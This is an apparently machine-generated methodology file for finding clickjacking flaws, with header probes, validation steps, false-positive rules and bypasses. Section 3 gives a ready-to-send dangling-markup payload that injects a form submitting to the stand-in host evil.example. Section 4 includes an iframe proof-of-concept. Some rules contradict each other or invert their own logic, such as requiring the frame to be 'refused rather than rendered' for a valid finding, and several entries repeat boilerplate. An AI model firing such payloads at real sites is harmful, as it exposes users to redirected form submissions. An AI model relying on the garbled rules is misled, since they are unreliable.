# Methodology — Clickjacking / UI Redressing

> Derived from 11 verified items. Regenerate with `python -m wks.methodgen --class clickjacking --apply`. Do not hand-edit: this file is a projection of the evidence, and edits are lost on the next cycle.

**Surface.** A foreign page can frame and overlay the target so the user's click means something they did not intend.

**References.** CWE-1021 · A05:2021

## 1. Preconditions

_Nothing below is reachable until these hold. Confirm each against the target before spending time on the technique._

**A web endpoint is clickjacking-exposed only when its responses carry neither an X-Frame-Options header nor a CSP frame-ancestors directive on every state-changing route.**

Probe: send `GET /target HTTP/1.1` with `Host: <victim>` and `Cookie: session=<valid>`, then read the response header block. Absence of `X-Frame-Options` AND absence of `frame-ancestors` inside the `Content-Security-Policy` header is the precondition for framing; Cloudflare's own Pages documentation treats X-Frame-Options as the control that stops an application being embedded in an iframe, and GitHub's platform-security writeup states that frame-ancestors is the directive that mitigates clickjacking and framing attacks. Test the ERROR path and the POST target separately: a redirect or a 4xx that drops the header while the 200 keeps it means the endpoint is only partly covered, and an attacker only needs the uncovered one. Differential: compare the header set on an authenticated 200 against the same route unauthenticated. A header that only appears on the authenticated response (or only on the static shell) changes the verdict.

- *Disproof:* If ANY response on the state-changing route returns a valid `X-Frame-Options: DENY`/`SAMEORIGIN` or a `Content-Security-Policy` containing `frame-ancestors`, the endpoint is not frameable and this claim is false for it. A 200 with either header present, observed on a raw request with no browser involved, disproves it.
- *Evidence:* high_confidence — [blog.cloudflare.com](https://blog.cloudflare.com/custom-headers-for-pages/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

## 2. Reconnaissance signals

_What to look for while mapping the surface, and where each signal tells you the rest of the procedure is worth running._

**A response carrying X-Frame-Options but no CSP frame-ancestors is a weak-mitigation signal, not a finding: legacy X-Frame-Options cannot express per-path allowlists and is ignored when frame-ancestors is present.**

Read the raw header block and classify it into three buckets rather than pass/fail. Bucket A: no X-Frame-Options and no frame-ancestors = exposed. Bucket B: X-Frame-Options: SAMEORIGIN (or DENY) with no frame-ancestors = legacy-only. Bucket C: both present = modern, and the stricter wins per RFC/CSP precedence in supporting browsers. GitHub is the worked example of why the two are not interchangeable in practice: because frame-ancestors lacked broad browser support, GitHub set BOTH the frame-ancestors directive and the X-FRAME-OPTIONS header in all responses. Cloudflare's Pages hardening example ships the same pair together, `Content-Security-Policy: script-src 'self'; frame-ancestors 'none';` alongside X-Frame-Options. So for a hunter, a lone X-Frame-Options is the SIGNAL worth recording, and the disambiguating test is browser-side: load the target in an iframe from a different origin and observe whether the frame renders or is refused.

- *Disproof:* If a raw request to the endpoint returns a `Content-Security-Policy` header whose directives include `frame-ancestors` (any value), the response is already in bucket C and the 'legacy-only' signal does not apply. Equally, if a cross-origin iframe load of the endpoint is refused by a current browser, the practical exposure is nil regardless of which headers are present, and the signal is a false lead.
- *Evidence:* high_confidence — [blog.cloudflare.com](https://blog.cloudflare.com/custom-headers-for-pages/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

## 3. Test sequence

_Concrete mutations to try. Each is written to be executable, not to be a description of the vulnerability._

**A click-redress that does not need a full overlay works by leaving an HTML tag unclosed, so the victim's click on the visible control is parsed as a submit of an attacker-controlled form.**

The payload shape is an unclosed attribute or CDATA-bearing tag, not an invisible iframe. Reproduce: `GET /comments?q=%3Cform+action%3D%22https%3A%2F%2Fevil.example%2F%22%3E%3Cbutton%3EClick%3C%2Fbutton%3E%3Ctextarea+name%3D%27` on any endpoint that reflects a path or query into an error or comment page. The response HTML then shows an unclosed `name='`; the parser treats the next real `<form>` as nested inside the injected one, and browsers prefer the topmost form element, so the victim's click submits to the attacker's action. GitHub's post-CSP writeup documents this exact bypass of a dangling-markup mitigation, and frames it as: combining a `<textarea>` tag with an unclosed attribute bypasses the protection. Google's guidance supplies the precondition that makes the reflection dangerous: error pages commonly include the path component in the rendered HTML, so the injection lands in the page rather than being escaped. Confirm by parsing the returned HTML, not by eyeballing: does the injected form element end up as an ancestor of the page's real form? If yes, the click is redirected.

- *Disproof:* If the returned HTML has the injected attribute and tag balanced by the application's own sanitiser, so that no injected element becomes an ancestor of the page's real form, the technique does not work. Concretely: replay the payload and confirm the attacker `action` is not an ancestor-form target and that clicking the visible control submits to the application's own endpoint, with no request to the attacker's host.
- *Evidence:* high_confidence — [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/); [security.googleblog.com](https://security.googleblog.com/2011/05/website-security-for-webmasters.html)

## 4. Validation

_How to prove the finding rather than infer it. A technique that cannot be validated must not be reported._

**A clickjacking finding is validated only by a differential browser render showing a cross-origin frame actually loaded and a decoy click landing on a framed state-changing control, not by the absence of a frame-protective header.**

Header inspection tells you a defence is missing; only a render tells you the attack lands. Run the page in a real browser under a scripted cross-origin parent at controlled offsets, capture whether the framed document painted at all, and record where a click at the decoy coordinates is dispatched. Three outcomes must be distinguished: the frame refuses to load and the parent shows the Invalid frame refusal (the defence works, no finding); the frame loads but every interactive control requires re-authentication or a second factor, which caps the impact (a hardening note); the frame loads and a single click in the decoy region changes server-side state for the active session (a finding). Note that these mechanisms are all independent of each other, and where possible more than one of them should be implemented in order to provide defense in depth, so a page may be protected by frame-ancestors alone, by SameSite alone, or by a frame-buster alone, and each produces a different render result. Capture the network trace alongside the render so the state change is attributable to the framed request.

- *Disproof:* The validation fails, and there is no clickjacking finding, if the framed document never paints in the cross-origin parent; the parent receives a frame-busting navigation and the framed content is replaced; the click at the decoy coordinates is dispatched to the parent page rather than the frame (an overlay that is not actually over the control); the state change requires a second factor or a re-authentication step the attacker cannot supply; or replaying the framed request without a real click produces the same state change, which means the outcome was a CSRF, not UI redress. Record the click dispatch target, not just the missing header.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/clickjacking/)

**The convincing clickjacking evidence is a PoC page that frames the target in an attacker-controlled document and demonstrates that a user interaction intended for the attacker's content lands on the framed target, which proves the UI is being redressed rather than merely that a header is absent.**

Mechanism: The convincing clickjacking evidence is a PoC page that frames the target in an attacker-controlled document and demonstrates that a user interaction intended for the attacker's content lands on the framed target, which proves the UI is being redressed rather than merely that a header is absent. How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: If the framed resource refuses to load in the nested context because the ancestor check aborts the load, or the target requires a fresh interaction the attacker cannot borrow, the redressing claim collapses and only a missing-header hardening note remains; a bare 200 response to a HEAD or OPTIONS probe proves nothing about framing.

- *Disproof:* If the framed resource refuses to load in the nested context because the ancestor check aborts the load, or the target requires a fresh interaction the attacker cannot borrow, the redressing claim collapses and only a missing-header hardening note remains; a bare 200 response to a HEAD or OPTIONS probe proves nothing about framing.
- *Evidence:* high_confidence — [tomcat.apache.org](https://tomcat.apache.org/tomcat-9.0-doc/config/filter.html); [w3.org](https://www.w3.org/TR/CSP2/)

**A clickjacking finding is only validated when two independent observations agree: the raw header block lacks both frame protections, and a real cross-origin iframe load of the page is refused rather than rendered.**

Step 1, headers. `GET /target HTTP/1.1` with a valid session cookie, raw socket, no rewriting. Record the presence and value of `X-Frame-Options` and of `frame-ancestors` inside `Content-Security-Policy`. Step 2, render. Serve a local page containing `<iframe src="https://victim.example/target"></iframe>` from a different origin and record whether the frame body paints. Interpret the pair: headers present AND frame refused = protected, close. Headers absent AND frame rendered = exposed, confirm. Headers absent AND frame refused = a control exists elsewhere (CSP via meta tag, a WAF, or a cookie-gated render) and the header-only finding is a false positive. Headers present AND frame rendered = the protection is malformed or scoped to a path that does not cover this route. GitHub's writeup is why both are emitted at once - frame-ancestors lacks broad support, so X-FRAME-OPTIONS is set alongside it - and Cloudflare's docs show the same pairing. A 200 header block with `frame-ancestors` present in the CSP satisfies step 1 on its own.

- *Disproof:* Disproof is any one of: a raw response on the target route that carries `X-Frame-Options` or a `Content-Security-Policy` containing `frame-ancestors`; or a cross-origin iframe load that is refused by a current browser; or a frame that renders but exposes no state-changing control, in which case there is nothing to redress and the finding does not stand.
- *Evidence:* high_confidence — [blog.cloudflare.com](https://blog.cloudflare.com/custom-headers-for-pages/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

## 5. False-positive rejection

_The checks that eliminate the most common non-findings. Run these BEFORE reporting, not after a rejection._

**This LOOKS like clickjacking (an iframe embeds an authenticated page) but is actually a benign same-origin embed, separated by the frame's document being same-origin with the embedding page.**

The false positive: a scanner or a reviewer sees `<iframe src="/app/widget">` on an authenticated page and files clickjacking. It is benign when the framed document is SAME-ORIGIN with the embedder, because the frame then enforces the same-origin policy exactly as if the content had been opened in its own window or tab - GitHub's writeup puts it that way when justifying its own frame-src policy, and still restricts framing for defence in depth rather than because same-origin framing is exploitable. The separating observation is the origin, not the presence of the iframe: fetch the framed document and compare its scheme, host and port to the embedding page's, and inspect whether the framed document can read the parent's DOM (`document.referrer`/`parent.document` reachability from the framed context). A genuine clickjacking payload MUST be cross-origin from the victim - it is served from evil.example and relies on the browser allowing the frame - so a same-origin embed fails the precondition the attack needs. CrowdStrike's Kovter writeup is the reminder that the attack's own definition is about tricking a user into clicking a control on ANOTHER page, which is a cross-origin relationship by construction. Record the verdict only after the origin comparison, never from the iframe's presence alone.

- *Disproof:* Disproof of the FP verdict: the framed document's origin differs from the embedder's (different host, or different scheme/port), or the framed document can reach into the parent document. Either observation makes the embed cross-origin and the finding real, so this is not a same-origin benign embed. Conversely, a strictly same-origin frame with no parent-DOM reach is confirmed benign.
- *Evidence:* high_confidence — [crowdstrike.com](https://www.crowdstrike.com/blog/kovter-killer-how-to-remediate-the-apt-of-clickjacking/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

**A frame-ancestors directive that appears in a meta element rather than a response header is not a defence, because the directive must be ignored in a policy defined via meta, so a scanner that parses the HTML and finds it has found nothing enforced.**

Mechanism: A frame-ancestors directive that appears in a meta element rather than a response header is not a defence, because the directive must be ignored in a policy defined via meta, so a scanner that parses the HTML and finds it has found nothing enforced. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS enforced when the same directive is also present in a real Content-Security-Policy response header, which takes precedence; it is NOT enforced when the meta-tag form is the only place it appears, in which case the page remains framable from any origin and the finding stands. The related server-side gap is that a protection header added only on success responses is missing from error and redirect responses.

- *Disproof:* It IS enforced when the same directive is also present in a real Content-Security-Policy response header, which takes precedence; it is NOT enforced when the meta-tag form is the only place it appears, in which case the page remains framable from any origin and the finding stands. The related server-side gap is that a protection header added only on success responses is missing from error and redirect responses.
- *Evidence:* high_confidence — [httpd.apache.org](https://httpd.apache.org/docs/2.4/mod/mod_headers.html); [w3.org](https://www.w3.org/TR/CSP2/)

**An embeddable page is only a reportable clickjacking finding when the framed page exposes a state-changing or authenticating interaction an attacker would want to borrow; a framed page with no actionable controls is at most a low-severity hardening note.**

Mechanism: An embeddable page is only a reportable clickjacking finding when the framed page exposes a state-changing or authenticating interaction an attacker would want to borrow; a framed page with no actionable controls is at most a low-severity hardening note. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS reportable when the framed page renders a delete, transfer, approval, or settings control reachable by the forced click; it is NOT when the framed resource is a public read-only view with no interactive elements, since nothing of value can be redressed and the missing control header carries no exploitation path.

- *Disproof:* It IS reportable when the framed page renders a delete, transfer, approval, or settings control reachable by the forced click; it is NOT when the framed resource is a public read-only view with no interactive elements, since nothing of value can be redressed and the missing control header carries no exploitation path.
- *Evidence:* high_confidence — [nginx.org](https://nginx.org/en/docs/http/ngx_http_headers_module.html); [w3.org](https://www.w3.org/TR/CSP2/)

**A Content-Security-Policy that defines default-src 'none' but omits frame-ancestors does not prevent framing, because frame-ancestors does not fall back to the default sources, so a hunter cannot treat a strict-looking policy as clickjacking protection.**

Mechanism: A Content-Security-Policy that defines default-src 'none' but omits frame-ancestors does not prevent framing, because frame-ancestors does not fall back to the default sources, so a hunter cannot treat a strict-looking policy as clickjacking protection. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS protection when frame-ancestors or an equivalent X-Frame-Options value is actually present and non-permissive; it is NOT when the policy relies on default-src or frame-src alone, since the spec states explicitly that an absent frame-ancestors leaves the resource framable from anywhere.

- *Disproof:* It IS protection when frame-ancestors or an equivalent X-Frame-Options value is actually present and non-permissive; it is NOT when the policy relies on default-src or frame-src alone, since the spec states explicitly that an absent frame-ancestors leaves the resource framable from anywhere.
- *Evidence:* high_confidence — [tomcat.apache.org](https://tomcat.apache.org/tomcat-9.0-doc/config/filter.html); [w3.org](https://www.w3.org/TR/CSP2/)

## 6. Known bypasses

_Filters and controls that have defeated the techniques above. Treat these as the reason a naive test fails, not as proof of safety._

**X-Frame-Options SAMEORIGIN is defeated by an intermediate same-origin frame nested inside an attacker page, because it matches only the top-level document's location, whereas a per-ancestor check inspects every ancestor in the chain.**

Mechanism: X-Frame-Options SAMEORIGIN is defeated by an intermediate same-origin frame nested inside an attacker page, because it matches only the top-level document's location, whereas a per-ancestor check inspects every ancestor in the chain. How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It is not defeated when the top-level document itself is the attacker origin, because the match then fails at the first ancestor; it IS defeated when the target can be embedded by one of its own pages that in turn can be framed cross-origin, since every-ancestor checking is what closes that gap.

- *Disproof:* It is not defeated when the top-level document itself is the attacker origin, because the match then fails at the first ancestor; it IS defeated when the target can be embedded by one of its own pages that in turn can be framed cross-origin, since every-ancestor checking is what closes that gap.
- *Evidence:* high_confidence — [nginx.org](https://nginx.org/en/docs/http/ngx_http_headers_module.html); [w3.org](https://www.w3.org/TR/CSP2/)

## Chaining

_No verified chain_link items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Impact

_No verified impact items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Coverage gap

These stages have no verified evidence and are therefore absent above: Chaining, Impact.
A procedure with a missing validation stage is not safe to act on — it produces findings rather than proofs.

---

*Generated from the evidence base. Where this file and the database disagree, the database is correct.*
